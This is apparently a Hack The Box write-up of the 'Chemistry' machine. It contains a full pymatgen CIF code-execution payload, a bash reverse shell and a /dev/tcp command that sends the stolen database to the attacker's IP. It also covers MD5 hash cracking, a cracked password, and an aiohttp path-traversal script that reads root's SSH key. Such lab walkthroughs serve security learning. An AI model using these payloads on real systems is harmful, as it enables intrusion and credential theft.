---
layout: post
title: "Chemistry HTB writeup"
subtitle: "Walkethrough for the Chemistry HTB machine."
date: 2024-10-20 23:45:13
background: '/img/posts/04.jpg'

---

## Report

Beginning with our usual `nmap` search  

```bash
nmap 10.129.253.45 -sV -p-
```

We get some open ports.

<br/> 
<img src="/img/chemistry_screenshots/Pasted image 20241021121413.png" alt="1" style="width:700px; height:auto;">
<br/> 


- 22: `SSH`
- 5000: `Python 3.9.5` server `Werkzeug 3.0.3`

The server is a `python` server with an outdated version of `flask` (`Werkzeug 3.0.3`) running. Searching with this specific information, we get some vulnerabilities but not specified to our server.  

<br/> 
<img src="/img/chemistry_screenshots/Pasted image 20241021121700.png" alt="1" style="width:700px; height:auto;">
<br/>

We can get back to it later.

Visiting the `webserver` on port `5000`.  

<br/> 
<img src="/img/chemistry_screenshots/Pasted image 20241021123034.png" alt="1" style="width:700px; height:auto;">
<br/>

We can see a `Chemistry CIF analyzer`.

`CIF` stands for` Crystallographic Information File`.

<blockquote>
  <p><strong>CIF:</strong> It’s a standardized text file format used to store detailed information about the 3D structure of crystals, typically from X-ray crystallography experiments.This file is essential for chemists and crystallographers because it helps in sharing and analyzing crystal structures, which are important for understanding how molecules are arranged in solids.</p>
</blockquote>

The `CIF` contains data like:

- The positions of atoms in the crystal.
- The type of atoms.
- Bond lengths, angles, and symmetry information.

When clicking on `register`, we are prompted to register a new account.  

<br/> 
<img src="/img/chemistry_screenshots/Pasted image 20241021123550.png" alt="1" style="width:700px; height:auto;">
<br/>

Upon registering, we are welcomed with a `dashboard` where we can upload CIF files.  

<br/> 
<img src="/img/chemistry_screenshots/Pasted image 20241021123620.png" alt="1" style="width:700px; height:auto;">
<br/>

We can click on `here` where we are redirected to `http://10.129.253.45:5000/static/example.cif` to download an example of a `CIF` file.  

```cif
data_Example
_cell_length_a    10.00000
_cell_length_b    10.00000
_cell_length_c    10.00000
_cell_angle_alpha 90.00000
_cell_angle_beta  90.00000
_cell_angle_gamma 90.00000
_symmetry_space_group_name_H-M 'P 1'
loop_
 _atom_site_label
 _atom_site_fract_x
 _atom_site_fract_y
 _atom_site_fract_z
 _atom_site_occupancy
 H 0.00000 0.00000 0.00000 1
 O 0.50000 0.50000 0.50000 1
```

When we upload this specific file, we get an option either to `delete` or to `view` the file.  

<br/> 
<img src="/img/chemistry_screenshots/Pasted image 20241021123943.png" alt="1" style="width:700px; height:auto;">
<br/>

When clicking on `view`, we see the information being displayed.  

<br/> 
<img src="/img/chemistry_screenshots/Pasted image 20241021124139.png" alt="1" style="width:700px; height:auto;">
<br/>

The file was parsed to extract the `lattice parameters`, `atomic states` and more using a `python` library.

With this information in hands, we can search for something more specific now. 

We found this [link](https://github.com/materialsproject/pymatgen/security/advisories/GHSA-vgv8-5cpj-qj2f) explaining an `RCE` in the  `pymatgen` python library when parsing a `CIF` file.

The original exploit 

```cif
data_5yOhtAoR
_audit_creation_date            2018-06-08
_audit_creation_method          "Pymatgen CIF Parser Arbitrary Code Execution Exploit"

loop_
_parent_propagation_vector.id
_parent_propagation_vector.kxkykz
k1 [0 0 0]

_space_group_magn.transform_BNS_Pp_abc  'a,b,[d for d in ().__class__.__mro__[1].__getattribute__ ( *[().__class__.__mro__[1]]+["__sub" + "classes__"]) () if d.__name__ == "BuiltinImporter"][0].load_module ("os").system ("touch pwned");0,0,0'


_space_group_magn.number_BNS  62.448
_space_group_magn.name_BNS  "P  n'  m  a'  "
```

The exploit create a file called `pwned` in the current directory. Changing the payload to add a reverse shell `bash -c 'sh -i >& /dev/tcp/IP/4444 0>&1'`

Create the `pwn.cif` file and upload it on the `webserver`.  

<br/> 
<img src="/img/chemistry_screenshots/Pasted image 20241021125049.png" alt="1" style="width:700px; height:auto;">
<br/>

For an unknown reason, the exploit didn't work.  
<br/> 
<img src="/img/chemistry_screenshots/Pasted image 20241021125133.png" alt="1" style="width:700px; height:auto;">
<br/>

Changing the payload to add the full path of the `bash` binary and try again.  

<br/> 
<img src="/img/chemistry_screenshots/Pasted image 20241021125247.png" alt="1" style="width:700px; height:auto;">
<br/>

We get a connection as  the `app` user.   

Upgrading a `shell` to a proper `TTY shell` using  those commands.  

```bash
python3 -c "import pty;pty.spawn('/bin/bash')"
```
```bash
export TERM=xterm-256color
```

We get a proper `shell`.  

<br/> 
<img src="/img/chemistry_screenshots/Pasted image 20241021182918.png" alt="1" style="width:700px; height:auto;">
<br/>

Checking the source code of the `app.py`.

```python
from flask import Flask, render_template, request, redirect, url_for, flash
from werkzeug.utils import secure_filename
from flask_sqlalchemy import SQLAlchemy
from flask_login import LoginManager, UserMixin, login_user, login_required, logout_user, current_user
from pymatgen.io.cif import CifParser
import hashlib
import os
import uuid

app = Flask(__name__)
app.config['SECRET_KEY'] = 'MyS3cretCh3mistry4PP'
app.config['SQLALCHEMY_DATABASE_URI'] = 'sqlite:///database.db'
app.config['UPLOAD_FOLDER'] = 'uploads/'
app.config['ALLOWED_EXTENSIONS'] = {'cif'}

db = SQLAlchemy(app)
login_manager = LoginManager(app)
login_manager.login_view = 'login'

class User(UserMixin, db.Model):
    id = db.Column(db.Integer, primary_key=True)
    username = db.Column(db.String(150), nullable=False, unique=True)
    password = db.Column(db.String(150), nullable=False)

class Structure(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    user_id = db.Column(db.Integer, db.ForeignKey('user.id'), nullable=False)
    filename = db.Column(db.String(150), nullable=False)
    identifier = db.Column(db.String(100), nullable=False, unique=True)

@login_manager.user_loader
def load_user(user_id):
    return User.query.get(int(user_id))

def allowed_file(filename):
    return '.' in filename and filename.rsplit('.', 1)[1].lower() in app.config['ALLOWED_EXTENSIONS']

def calculate_density(structure):
    atomic_mass_Si = 28.0855
    num_atoms = 2
    mass_unit_cell = num_atoms * atomic_mass_Si
    mass_in_grams = mass_unit_cell * 1.66053906660e-24
    volume_in_cm3 = structure.lattice.volume * 1e-24
    density = mass_in_grams / volume_in_cm3
    return density

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/register', methods=['GET', 'POST'])
def register():
    if request.method == 'POST':
        username = request.form.get('username')
        password = request.form.get('password')
        if User.query.filter_by(username=username).first():
            flash('Username already exists.')
            return redirect(url_for('register'))
        hashed_password = hashlib.md5(password.encode()).hexdigest()
        new_user = User(username=username, password=hashed_password)
        db.session.add(new_user)
        db.session.commit()
        login_user(new_user)
        return redirect(url_for('dashboard'))
    return render_template('register.html')

@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        username = request.form.get('username')
        password = request.form.get('password')
        user = User.query.filter_by(username=username).first()
        if user and user.password == hashlib.md5(password.encode()).hexdigest():
            login_user(user)
            return redirect(url_for('dashboard'))
        flash('Invalid credentials')
    return render_template('login.html')

@app.route('/logout')
@login_required
def logout():
    logout_user()
    return redirect(url_for('index'))

@app.route('/dashboard')
@login_required
def dashboard():
    structures = Structure.query.filter_by(user_id=current_user.id).all()
    return render_template('dashboard.html', structures=structures)

@app.route('/upload', methods=['POST'])
@login_required
def upload_file():
    if 'file' not in request.files:
        return redirect(request.url)
    file = request.files['file']
    if file.filename == '':
        return redirect(request.url)
    if file and allowed_file(file.filename):
        filename = secure_filename(file.filename)
        identifier = str(uuid.uuid4())
        filepath = os.path.join(app.config['UPLOAD_FOLDER'], identifier + '_' + filename)
        file.save(filepath)
        new_structure = Structure(user_id=current_user.id, filename=filename, identifier=identifier)
        db.session.add(new_structure)
        db.session.commit()
        return redirect(url_for('dashboard'))
    return redirect(request.url)

@app.route('/structure/<identifier>')
@login_required
def show_structure(identifier):
    structure_entry = Structure.query.filter_by(identifier=identifier, user_id=current_user.id).first_or_404()
    filepath = os.path.join(app.config['UPLOAD_FOLDER'], structure_entry.identifier + '_' + structure_entry.filename)
    parser = CifParser(filepath)
    structures = parser.parse_structures()

    structure_data = []
    for structure in structures:
        sites = [{
            'label': site.species_string,
            'x': site.frac_coords[0],
            'y': site.frac_coords[1],
            'z': site.frac_coords[2]
        } for site in structure.sites]

        lattice = structure.lattice
        lattice_data = {
            'a': lattice.a,
            'b': lattice.b,
            'c': lattice.c,
            'alpha': lattice.alpha,
            'beta': lattice.beta,
            'gamma': lattice.gamma,
            'volume': lattice.volume
        }

        density = calculate_density(structure)

        structure_data.append({
            'formula': structure.formula,
            'lattice': lattice_data,
            'density': density,
            'sites': sites
        })

    return render_template('structure.html', structures=structure_data)

@app.route('/delete_structure/<identifier>', methods=['POST'])
@login_required
def delete_structure(identifier):
    structure = Structure.query.filter_by(identifier=identifier, user_id=current_user.id).first_or_404()
    filepath = os.path.join(app.config['UPLOAD_FOLDER'], structure.identifier + '_' + structure.filename)
    if os.path.exists(filepath):
        os.remove(filepath)
    db.session.delete(structure)
    db.session.commit()
    return redirect(url_for('dashboard'))

if __name__ == '__main__':
    with app.app_context():
        db.create_all()
    app.run(host='0.0.0.0', port=5000)
```

We can see the server identified earlier being `werkzeug`, we can see the `pymatgen` library too that we blindly identified. We can see in the register function a callout to a database. Checking running ports, we did not find any `SQL` instance running and the machine did not have `SQL` installed.  

<br/> 
<img src="/img/chemistry_screenshots/Pasted image 20241021183304.png" alt="1" style="width:700px; height:auto;">
<br/>

This means that the `DB` file is being accessed locally from the `webserver`.   
The file is identified in the `/home/app/instance` path as `database.db`.  

<br/> 
<img src="/img/chemistry_screenshots/Pasted image 20241021183441.png" alt="1" style="width:700px; height:auto;">
<br/>

Reading the file, we can see some `credentials`.  
<br/> 
<img src="/img/chemistry_screenshots/Pasted image 20241021183548.png" alt="1" style="width:700px; height:auto;">
<br/>

the only valid user on the system and the potential next target is `rosa` but before that, we download the file to our local machine to be able to read it properly.  

```bash
cat database.db  >& /dev/tcp/10.10.16.57/4444 0>&1
```

Don't forget to open a `listener` to accept the file.  

<br/> 
<img src="/img/chemistry_screenshots/Pasted image 20241021184002.png" alt="1" style="width:700px; height:auto;">
<br/>

Reading the content of the file using `sqlite3`.

```bash
sqlite3 database.db
```

We can see the `user` table.  

<br/> 
<img src="/img/chemistry_screenshots/Pasted image 20241021184254.png" alt="1" style="width:700px; height:auto;">
<br/>

We read the content of the table user using this `SQL` statement.  

```sql
select * from user;
```

We can find some credentials for multiple users.  
<br/> 
<img src="/img/chemistry_screenshots/Pasted image 20241021202839.png" alt="1" style="width:700px; height:auto;">
<br/>

As we said earlier, we are interested with the user `rosa`.   

<br/> 
<img src="/img/chemistry_screenshots/Pasted image 20241021202937.png" alt="1" style="width:700px; height:auto;">
<br/>

The hash is in `MD5` format. To crack it, we use `hashcat`.  

```bash
hashcat -m 0 hash_rosa /usr/share/wordlists/rockyou.txt
```

We get the `password` of the user.  

<br/> 
<img src="/img/chemistry_screenshots/Pasted image 20241021203119.png" alt="1" style="width:700px; height:auto;">
<br/>

`rosa:unicorniosrosados`  

`SSH` using the discovered credentials.  

<br/> 
<img src="/img/chemistry_screenshots/Pasted image 20241021203313.png" alt="1" style="width:700px; height:auto;">
<br/>

From a previous enumeration, we discovered an `internal service` running on port `8080`.  

<br/> 
<img src="/img/chemistry_screenshots/Pasted image 20241021203424.png" alt="1" style="width:700px; height:auto;">
<br/>

To list the running processes under `root` user using the command `ps aux`, we find a potential `privesc`.  

<br/> 
<img src="/img/chemistry_screenshots/Pasted image 20241021212242.png" alt="1" style="width:700px; height:auto;">
<br/>

We can see a `process` running.  

```bash
root        1000  0.0  1.3  35528 27672 ?        Ss   14:49   0:00 /usr/bin/python3.9 /opt/monitoring_site/app.py
```

Checking the path, we get a `permission denied`.  
<br/> 
<img src="/img/chemistry_screenshots/Pasted image 20241021212428.png" alt="1" style="width:700px; height:auto;">
<br/>

But we know that a `python server` is running under `root` and the port is most likely to be `8080`.  
We make local `SSH` port forwarding.  

```bash
ssh -L 8081:127.0.0.1:8080 rosa@10.129.217.239
```

Accessing the site under `127.0.0.1:8081`  

<br/> 
<img src="/img/chemistry_screenshots/Pasted image 20241021212732.png" alt="1" style="width:700px; height:auto;">
<br/>

After a lot of search in this area, no valid `privesc` vector was found so tried to search with the same methodology as the foothold and check the server version running.  

```bash
curl --head http://127.0.0.1:8080
```
We get a response.  

<br/> 
<img src="/img/chemistry_screenshots/Pasted image 20241021213217.png" alt="1" style="width:700px; height:auto;">
<br/>

Searching for `aiohttp 3.9.1` exploit, we can find this [site](https://github.com/z3rObyte/CVE-2024-23334-PoC) where it references a `path traversal` vulnerability using this `exploit`.   

```bash
#!/bin/bash

url="http://localhost:8081"
string="../"
payload="/static/"
file="etc/passwd" # without the first /

for ((i=0; i<15; i++)); do
    payload+="$string"
    echo "[+] Testing with $payload$file"
    status_code=$(curl --path-as-is -s -o /dev/null -w "%{http_code}" "$url$payload$file")
    echo -e "\tStatus code --> $status_code"
    
    if [[ $status_code -eq 200 ]]; then
        curl -s --path-as-is "$url$payload$file"
        break
    fi
done
```

The exploit uses the `url` parameter, and append the `../` string to it 15 times, checking with each loop, the possibility to reach  the `/etc/passwd` file in the `file` parameter. The exploit makes a request to the `url` with the `curl --path-as-is` attribute.  

Adjusting the payload to our needs changing the `url` and running it. We get a `404` error.  

<br/> 
<img src="/img/chemistry_screenshots/Pasted image 20241021213637.png" alt="1" style="width:700px; height:auto;">
<br/>

The exploit tries to achieve the vulnerability under the `/static/` directory mentioned in the `payload` variable. reading the source code of the page, we can see a different path.  

<br/> 
<img src="/img/chemistry_screenshots/Pasted image 20241021213801.png" alt="1" style="width:700px; height:auto;">
<br/>

Changing the value of the payload to `/assets/` and try again.  

<br/> 
<img src="/img/chemistry_screenshots/Pasted image 20241021213841.png" alt="1" style="width:700px; height:auto;">
<br/>

We get a hittt! 

Now changing the `file` to make the exploit request `/root/.ssh/id_rsa` instead of the `passwd` file.  


<br/> 
<img src="/img/chemistry_screenshots/Pasted image 20241021213953.png" alt="1" style="width:700px; height:auto;">
<br/>

We get the private key of the `root` user.  
`SSH` to the machine as `root`.  
The machine was `pawned` successfully.  


<br/> 
<img src="/img/chemistry_screenshots/Screenshot_3.png" alt="1" style="width:700px; height:auto;">
<br/>
